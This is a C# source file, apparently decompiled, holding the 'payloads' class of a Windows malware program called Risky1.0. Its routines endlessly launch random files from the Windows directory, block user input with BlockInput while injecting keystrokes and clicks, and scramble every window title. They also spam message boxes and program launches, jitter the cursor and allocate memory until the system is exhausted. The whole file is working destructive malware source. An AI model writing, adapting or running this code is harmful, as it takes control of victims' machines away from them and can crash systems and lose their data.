using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Risky1._0;

internal class payloads
{
	private delegate bool EnumChildProc(IntPtr hWnd, IntPtr lParam);

	public delegate bool EnumWindowsProc(IntPtr hwnd, IntPtr lParam);

	public static Random r = new Random();

	public static long MB_ICONERROR = 16L;

	public static long MB_SYSTEMMODAL = 4096L;

	private const uint MOUSEEVENTF_LEFTDOWN = 2u;

	private const uint MOUSEEVENTF_LEFTUP = 4u;

	private const uint MOUSEEVENTF_RIGHTDOWN = 8u;

	private const uint MOUSEEVENTF_RIGHTUP = 16u;

	[DllImport("user32.dll")]
	public static extern bool SetCursorPos(int x, int y);

	[DllImport("user32.dll")]
	public static extern bool BlockInput(bool fBlockIt);

	[DllImport("user32.dll")]
	public static extern void mouse_event(uint dwFlags, uint dx, uint dy, uint dwData, IntPtr dwExtraInfo);

	[DllImport("user32.dll")]
	public static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

	[DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern int GetWindowTextW(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

	[DllImport("user32.dll")]
	private static extern bool EnumChildWindows(IntPtr hWndParent, EnumChildProc lpEnumFunc, IntPtr lParam);

	[DllImport("user32.dll")]
	private static extern int GetWindowTextLength(IntPtr hWnd);

	[DllImport("user32.dll")]
	private static extern bool IsWindowVisible(IntPtr hWnd);

	[DllImport("user32.dll", CharSet = CharSet.Unicode)]
	private static extern bool SetWindowTextW(IntPtr hWnd, string lpString);

	[DllImport("user32.dll")]
	private static extern IntPtr GetDesktopWindow();

	[DllImport("user32.dll")]
	public static extern int MessageBox(IntPtr hWnd, string lpText, string lpCaption, long uType);

	public static void openfiles()
	{
		while (true)
		{
			try
			{
				string[] files = Directory.GetFiles("C:\\Windows", "*.*", SearchOption.AllDirectories);
				Process.Start(files[r.Next(files.Length)]);
			}
			catch
			{
			}
			Thread.Sleep(r.Next(100, 2000));
		}
	}

	[STAThread]
	public static void input_spam()
	{
		int num = 5000;
		while (true)
		{
			BlockInput(fBlockIt: false);
			SendKeys.SendWait("RISKYTOORISKY");
			if (r.Next(2) == 1)
			{
				mouse_event(2u, 0u, 0u, 0u, IntPtr.Zero);
				mouse_event(4u, 0u, 0u, 0u, IntPtr.Zero);
			}
			else
			{
				mouse_event(8u, 0u, 0u, 0u, IntPtr.Zero);
				mouse_event(16u, 0u, 0u, 0u, IntPtr.Zero);
			}
			BlockInput(fBlockIt: true);
			Thread.Sleep(num);
			num = Math.Max(100, num - 250);
		}
	}

	public static void title_change()
	{
		Random rand = new Random();
		StringBuilder buff = new StringBuilder(256);
		int num = 2500;
		while (true)
		{
			EnumChildWindows(GetDesktopWindow(), changetext, IntPtr.Zero);
			if (num > 500)
			{
				num -= 100;
			}
			Thread.Sleep(num);
		}
		bool changetext(IntPtr topHwnd, IntPtr lParam)
		{
			GetWindowTextW(topHwnd, buff, 256);
			string text = buff.ToString();
			if (!string.IsNullOrEmpty(text))
			{
				char[] array = text.ToCharArray();
				int num2 = rand.Next(array.Length);
				array[num2] = '\u0001';
				string lpString = new string(array);
				SetWindowTextW(topHwnd, lpString);
				return true;
			}
			return true;
		}
	}

	public static void msgbox()
	{
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		MessageBoxButtons[] array = (MessageBoxButtons[])(object)new MessageBoxButtons[6]
		{
			default(MessageBoxButtons),
			(MessageBoxButtons)1,
			(MessageBoxButtons)2,
			(MessageBoxButtons)3,
			(MessageBoxButtons)4,
			(MessageBoxButtons)5
		};
		MessageBox.Show(get_unicode(2048), "", array[r.Next(array.Length)], (MessageBoxIcon)16);
	}

	public static string get_unicode(int amount)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < amount; i++)
		{
			int num;
			do
			{
				num = r.Next(32, 255);
			}
			while (char.IsControl((char)num));
			stringBuilder.Append(char.ConvertFromUtf32(num));
		}
		return stringBuilder.ToString();
	}

	public static void messageBoxSpawner()
	{
		while (true)
		{
			Process.Start("cmd.exe");
			Thread.Sleep(15000);
			Process.Start("mspaint");
			Thread.Sleep(15000);
			Process.Start("calc");
			Thread.Sleep(15000);
			Process.Start("control");
			Thread.Sleep(15000);
			Process.Start("taskmgr");
		}
	}

	public static void movecursor()
	{
		int num = 10;
		for (int i = 5; i <= 25; i += 5)
		{
			for (int j = 0; j < i; j++)
			{
				int x = Cursor.Position.X;
				int y = Cursor.Position.Y;
				SetCursorPos(x + r.Next(-num, num), y + r.Next(-num, num));
				Thread.Sleep(550 - i * 10);
			}
			num += 5;
		}
		while (true)
		{
			int x2 = Cursor.Position.X;
			int y2 = Cursor.Position.Y;
			SetCursorPos(x2 + r.Next(-num, num), y2 + r.Next(-num, num));
			Thread.Sleep(70);
		}
	}

	public unsafe static void memoryfiller()
	{
		List<byte[]> list = new List<byte[]>();
		List<IntPtr> list2 = new List<IntPtr>();
		int num = 10485760;
		while (true)
		{
			try
			{
				byte[] array = new byte[num];
				for (int i = 0; i < array.Length; i += 4096)
				{
					array[i] = byte.MaxValue;
				}
				list.Add(array);
			}
			catch
			{
			}
			try
			{
				IntPtr intPtr = Marshal.AllocHGlobal(num);
				byte* ptr = (byte*)(void*)intPtr;
				for (int j = 0; j < num; j += 4096)
				{
					ptr[j] = byte.MaxValue;
				}
				list2.Add(intPtr);
			}
			catch
			{
			}
			Thread.Sleep(350);
		}
	}
}
